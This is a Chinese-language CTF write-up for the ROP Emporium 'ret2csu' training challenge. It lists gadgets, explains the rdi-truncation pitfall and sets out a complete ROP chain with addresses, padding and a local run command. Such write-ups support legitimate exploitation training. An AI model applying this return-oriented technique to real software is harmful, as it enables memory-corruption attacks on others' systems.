# 30 ROP Emporium `ret2csu` 速通笔记

```text
64 位 ELF、No PIE、NX、无 canary、Partial RELRO、not stripped
主程序几乎没 gadget；pwnme / ret2win 都在配套的 libret2csu.so 里（RUNPATH = b'.'）
```

## 1. 目标与参数

```text
ret2win(uint64_t a, uint64_t b, uint64_t c)
   a == 0xdeadbeefdeadbeef
   b == 0xcafebabecafebabe
   c == 0xd00df00dd00df00d     # 三项都是 64 位 movabs + cmp QWORD，截断就失败
```

三参全中才会去读 `key.dat` / `encrypted_flag.dat` 解密并打印 flag；二进制里的
`usefulFunction` 演示了 `ret2win(1,2,3)` 这种错误调用（一定失败）。

## 2. 可用 gadget（`ROPgadget --binary ret2csu`）

| 地址 | gadget |
| --- | --- |
| `0x4006a3` | `pop rdi ; ret`（藏在 csu pop 序列里：`41 5f c3` 取第 2 字节） |
| `0x4006a1` | `pop rsi ; pop r15 ; ret` |
| `0x40069a` | `pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` |
| `0x400680` | `mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8]` |
| — | **没有** `pop rdx` |

## 3. 坑：`mov edi, r13d` 会把 rdi 截断

标准 ret2csu 两段式是 `csu_pop(...) -> csu_call`，但 `csu_call` 的第一条写寄存器就是
`mov edi, r13d`（**32 位写**，自动清零 rdi 高 32 位）。于是 `ret2win` 收到的
`rdi = 0x00000000deadbeef`，第一项检查直接失败。

解法：**让 csu 只负责 rdx**，把 `call [r12+rbx*8]` 指向一个不碰 rdx 的无害函数，
gadget 走完 epilogue 后 rdx 仍然有效，再用 `pop rdi` / `pop rsi` 补前两个参数：

```text
.init_array[0] = 0x600df0，内容 0x400600 (frame_dummy)
frame_dummy -> register_tm_clones : 只用 rax/rsi/rdi/rbp，末尾 pop rbp ; ret
                                    返回到 0x40068d，继续 csu 的 add rbx,1 / 收尾
```

## 4. 完整链（溢出偏移 0x20 + 8 = 40）

```text
'A'*40
csu_pop(0x40069a)
   rbx = 0                       -> call [r12+0]
   rbp = 1                       -> 循环一轮后退出
   r12 = 0x600df0                -> &frame_dummy（无害跳板）
   r13 = 0                       -> edi = 0
   r14 = 0                       -> rsi = 0
   r15 = 0xd00df00dd00df00d      -> rdx ★
csu_call(0x400680)
   0 * 7                         -> add rsp,8 + pop rbx/rbp/r12/r13/r14/r15
pop rdi(0x4006a3) ; 0xdeadbeefdeadbeef
pop rsi ; pop r15(0x4006a1) ; 0xcafebabecafebabe ; 0
ret2win@plt(0x400510)
```

注意 epilogue 要垫 **7 个 qword**（1 个 `add rsp,8` + 6 个 pop）才轮到返回地址；
`ret` 到 `ret2win@plt` 时 GOT 可能还没解析，PLT 自己会触发 `_dl_runtime_resolve`，
不影响已经摆好的 rdi/rsi/rdx。

## 5. 本地复现

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2csu'
source ../.venv/bin/activate
python 30_ropemporium_ret2csu_exp.py LOCAL
# 输出：ROPE{a_placeholder_32byte_flag!}
```

EXP 先 `chdir` 到脚本目录，保证 `libret2csu.so` / `key.dat` / `encrypted_flag.dat`
被 `RUNPATH=b'.'` 找到。官方无公开远程，要打远程时用 `HOST=... PORT=...` 覆盖。

## 6. 识别卡

```text
缺 pop rdx + 有 __libc_csu_init 长 pop 序列        -> ret2csu
目标第一参是 64 位常量                              -> csu 只设 rdx，call 指向不碰 rdx 的无害函数
                                                      （frame_dummy / register_tm_clones），
                                                      再 pop rdi / pop rsi 补前两参
call 后垫 7 个 qword；r12 必须是"指针的地址"（GOT / .init_array 项）
```
